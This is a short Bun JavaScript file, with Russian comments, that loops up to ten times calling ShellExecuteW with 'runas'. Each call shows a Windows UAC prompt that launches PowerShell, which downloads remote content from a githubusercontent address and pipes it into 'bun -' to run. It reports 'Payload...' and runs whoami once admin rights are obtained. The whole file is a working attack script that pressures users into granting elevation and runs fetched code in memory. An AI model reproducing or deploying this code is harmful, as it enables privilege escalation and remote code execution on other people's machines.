// admin-loop.js
const { dlopen, FFIType, ptr } = require("bun:ffi");

const shell32 = dlopen("shell32.dll", {
  ShellExecuteW: {
    args: [FFIType.ptr, FFIType.ptr, FFIType.ptr, FFIType.ptr, FFIType.ptr, FFIType.i32],
    returns: FFIType.i32,
  },
});

const toPtr = (str) => ptr(Buffer.from(str + "\0", "utf16le"));

async function isAdmin() {
  const proc = Bun.spawn({ cmd: ["net", "session"], stdout: "pipe", stderr: "pipe" });
  return (await proc.exited) === 0;
}

async function main() {
  console.log("🚀 PID:", process.pid);
  
  for (let i = 1; i <= 10; i++) {
    console.log(`\n=== Попытка ${i}/10 ===`);
    
    if (await isAdmin()) {
      console.log("✅ АДМИН! Payload...");
      const whoami = Bun.spawn({ cmd: ["whoami"], stdout: "pipe" });
      console.log("whoami:", (await new Response(whoami.stdout).text()).trim());
      return;
    }
    
    console.log("❌ Не админ. Запрашиваем UAC...");
    
    // ВНИМАНИЕ: Так как мы в памяти, передаем команду выполнения напрямую в UAC
    const payload = `(iwr 'https://githubusercontent.com').Content | bun -`;
    
    const result = shell32.symbols.ShellExecuteW(
      0,
      toPtr("runas"),
      toPtr("powershell.exe"),
      toPtr("-Command " + payload),
      0,
      1
    );
    
    console.log("ShellExecuteW:", result);
    await new Promise(r => setTimeout(r, 5000));
  }
}

main().catch(console.error);
